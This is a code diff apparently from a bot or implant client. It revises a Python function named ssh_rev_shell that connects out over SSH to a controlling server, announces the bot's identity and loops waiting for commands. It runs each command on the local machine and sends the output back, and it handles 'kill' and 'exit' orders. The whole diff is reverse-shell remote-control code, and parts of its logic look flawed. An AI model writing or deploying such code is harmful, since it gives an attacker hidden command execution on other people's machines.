@@ -102,51 +102,66 @@ def ssh_rev_shell(ip, user, key_file, bot_user, port=22):
 
     #while server_instructions != "kill":
     if ssh_session.active:
+
         print("[!] Sending identity!")
         ssh_session.send(bot_user.encode())
 
+        # Start a thread to handle timeout
+        timeout_thread = threading.Thread(target=max_timeout, args=(10,))
+        timeout_thread.start()
+
         print("[!] Listening for instructions ...")
-        server_instructions = ssh_session.recv(1024).decode().strip()
-        server_instructions = server_instructions.encode()
 
-        if server_instructions:
-            print(f"[!] Received command: {server_instructions}")
+        server_instructions = ""
+        while not timeout:
+            server_instructions = ssh_session.recv(1024).decode().strip()
+            server_instructions = server_instructions.encode()
 
-            # Handle termination command
-            if server_instructions == 'kill':
-                print("[!] Session terminated by the server!")
-                exit_gracefully()
+            if server_instructions:
+                print(f"[!] Received command: {server_instructions}")
+
+                # Handle termination command
+                if server_instructions == 'kill':
+                    print("[!] Session terminated by the server!")
+                    exit_gracefully()
+                if server_instructions == 'exit':
+                    print("[*] Session finished by the server. Continuing to next loop.")
+                    ssh_session.close()
+                    ssh_client.close()
+                    return
 
 
-            # Execute command on the channel and capture output
-            print("Trying to execute the command")
-            try:
-                response = exec_underlying_command(server_instructions)
-            except Exception as e:
-                response = f"Command failed:\t{e}"
 
-            ssh_session.send(response.encode())
 
-            print("[!] Response sent!")
+                # Execute command on the channel and capture output
+                print("Trying to execute the command")
+                try:
+                    response = exec_underlying_command(server_instructions)
+                except Exception as e:
+                    response = f"Command failed:\t{e}"
 
-            timeout_thread =  threading.Thread(target=max_timeout, args=())
-            if timeout == True:
-                timeout = False
-                ssh_session.close()
-                ssh_client.close()
-
-                response = f"Timeout while listening new instructions!"
                 ssh_session.send(response.encode())
+
                 print("[!] Response sent!")
 
-                return
+                timeout_thread =  threading.Thread(target=max_timeout, args=())
+                if timeout == True:
+                    timeout = False
+                    ssh_session.close()
+                    ssh_client.close()
 
-            #server_instructions = "kill"
-            ssh_session.close()
-            ssh_client.close()
-            return
-            
-    time.sleep(1)
+                    response = f"Timeout while listening new instructions!"
+                    ssh_session.send(response.encode())
+                    print("[!] Response sent!")
+
+                    return
+
+                #server_instructions = "kill"
+                ssh_session.close()
+                ssh_client.close()
+                return
+                
+        time.sleep(1)
 
 
 if __name__ == "__main__":
